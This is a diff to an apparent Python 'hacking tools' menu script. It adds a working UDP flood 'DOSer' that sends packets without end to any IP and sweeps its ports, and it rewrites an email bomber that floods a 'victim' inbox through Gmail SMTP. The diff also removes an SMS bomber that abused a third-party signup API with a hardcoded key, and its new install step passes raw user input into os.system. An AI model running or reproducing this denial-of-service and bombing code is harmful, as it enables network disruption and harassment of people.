@@ -6,7 +6,9 @@ try:
     from tld import get_tld
 except ModuleNotFoundError:
     print("modules are not installed")
-    os.system("pip install pyfiglet pyperclip requests python-whois python-nmap==0.6.1 pyshorteners==1.0.1")
+    pipy = input("do u have pip or pip3 installed?(pip/pip3): ")
+    os.system(pipy+" pip install pyfiglet pyperclip requests python-whois python-nmap==0.6.1 pyshorteners==1.0.1")
+    print("Pls re-run the program :)")
 
 if platform.system() == 'Windows':
     os.system("cls")
@@ -30,7 +32,7 @@ while ans:
     7. WAF(WEB APP FIREWALL) Detection (NMAP)
     8. Temp Mail
     9. Email Bomber
-    10. SMS Bomber
+    10. DOSer
     11. Exit/Quit
     """)
     ans=input("Choose Your T00l: ") 
@@ -286,65 +288,58 @@ while ans:
 ######################################--EMAIL BOMBER--#################################################
         print("Use a fake gmail acc to bomb and u must have support for 'less secure apps' set to 'turn on' on your Gmail. Here is the link to do so: https://www.google.com/settings/security/lesssecureapps")
         email_provider = 'smtp.gmail.com'
-        email_address = input("Enter Your Gmail(Gmail ur using to bomb -->: ")
-        password = input("Enter Your Gmail Password(Gmail Password ur using to bomb -->: ")
+        email_address = input("Enter Attackers Gmail(Gmail ur using to bomb the vitim) -->: ")
+        password = input("Enter Your Gmail Password(Gmail Password ur using to bomb the victim) -->: ")
         target_email = input("Enter Target email -->: ")
-        msg = input("Enter your txt message -->: ")
-        text_amount = int(input("Enter your amount of txt messages -->: "))
-        wait = int(input("Enter Delay Between each message -->: "))
+        msg = input("Enter your email message -->: ")
+        email_amount = int(input("Enter your amount of email's -->: "))
         server = smtplib.SMTP(email_provider, 587)
         server.starttls()
         server.login(email_address, password)
-        for _ in range(0,text_amount):
+        for _ in range(0,email_amount):
             server.sendmail(email_address,target_email,msg)
-            print("sent")
-            time.sleep(wait)
-        print("{} texts were sent. :)".format(text_amount))
+            print("sent!")
+            time.sleep(1)
+        print("sent {} emails. :)".format(email_amount))
         server.quit()
-######################################--SMS BOMBER--################################################# 
     elif ans=="10":
-        import requests as rq
-        def send(target):
-          header = {
-            "x-api-key": "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"
-          }
-          data = {
-            "requestType":"send",
-            "phoneNumber":target,
-            "screenName":"signin"
-          }
-          url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-44067eab-5337-99d8-11eb-99ca1e4db186"
-          res = rq.post(url, json=data, headers=header)
-          if res.json().get("code"):
-            data = {
-              "requestType":"send",
-              "phoneNumber":target,
-              "emailConsent":"true",
-              "whatsappConsent":"true",
-              "email":"cicas94417@iconmle.com"
-            }
-            url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
-            res = rq.post(url, json=data, headers=header)
-            if not res.json().get("sent"): return False
-          return True
-        def main():
-          target = input("[*] Target Number(with country code): ")
-          amount = int(input("[*] Total Amount of SMS to send: "))
-          sent, nsent = 0, amount
-          for i in range(1, amount + 1):
-            try:
-              if send(target):
-                print(f"[ID: {i}] SMS Sent!")
-                sent += 1
-                nsent -= 1
-              else:
-                print(f"[ID: {i}] SMS Not Sent...")
-            except KeyboardInterrupt: break
-            except Exception as e: print(e); break
-          print(f"\n[*] Total Target: {amount}\n[+] Sent: {sent}\n[-] Not Sent: {nsent}")
-
-        if __name__ == "__main__":
-          main()
+######################################--DOSER--#################################################
+        import socket
+        from datetime import datetime
+        now = datetime.now()
+        hour = now.hour
+        minute = now.minute
+        day = now.day
+        month = now.month
+        year = now.year
+        ##############
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1490)
+        #############
+        ip = input ("IP Target : ")
+        port = input ("Port : ")
+        os.system("cls")
+        os.system("clear")
+        ascii_banner = pyfiglet.figlet_format("AttackStarting!")
+        print(ascii_banner)
+        print ("[                    ] 0% ")
+        time.sleep(1)
+        print ("[=====               ] 25%")
+        time.sleep(1)
+        print ("[==========          ] 50%")
+        time.sleep(1)
+        print ("[===============     ] 75%")
+        time.sleep(1)
+        print ("[====================] 100%")
+        time.sleep(2)
+        sent = 0
+        while True:
+            sock.sendto(bytes, (ip, int(port)))
+            sent = int(sent) + 1
+            port = int(port) + 1
+            print ("Sent %s packets to %s throught port:%s"%(sent,ip,port))
+            if port == 65534:
+                port = 1
     elif ans=="11":
 ######################################--EXIT--#################################################
         exit()
